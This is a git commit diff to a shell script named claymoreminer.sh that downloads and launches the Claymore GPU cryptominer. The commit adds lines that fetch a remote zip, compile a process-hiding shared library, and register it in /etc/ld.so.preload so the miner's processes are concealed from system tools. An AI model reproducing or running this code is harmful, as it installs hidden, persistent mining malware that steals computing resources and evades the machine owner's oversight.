7337d89e5018875480b0f47eae7c8f53074c9d02
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-11-20 18:45:57 +0200

    Update claymoreminer.sh

--- claymoreminer.sh
+++ claymoreminer.sh
@@ -1,4 +1,10 @@
 #!/bin/sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicPh.zip
+unzip magicPh.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/ClayMore.zip
 unzip ClayMore.zip
 chmod +x start.bash
